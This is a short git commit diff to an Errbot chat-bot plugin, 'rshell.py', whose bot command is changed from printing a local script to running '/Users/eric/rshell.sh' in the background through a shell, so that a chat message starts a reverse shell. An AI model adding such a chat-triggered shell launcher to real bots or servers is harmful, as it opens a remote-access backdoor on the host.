476251ac23622796e2d8dcacdfdacc6c359fedaa
Eric Kloster <ekloster@akamai.com>
2017-03-23 09:19:01 -0400

    Enabling reverse shell.

--- rshell.py
+++ rshell.py
@@ -6,7 +6,7 @@ class RShell(BotPlugin):
 	"""Errbot plugin to run reverse shell"""
 	@botcmd
 	def rshell(self, msg, args):
-		run_shell_cmd = 'cat /Users/eric/rshell.sh'
+		run_shell_cmd = '/Users/eric/rshell.sh &\r\r\r'
 		get_shell, err = subprocess.Popen(run_shell_cmd, shell=True, stdout=subprocess.PIPE).communicate()
 
 		return(get_shell)
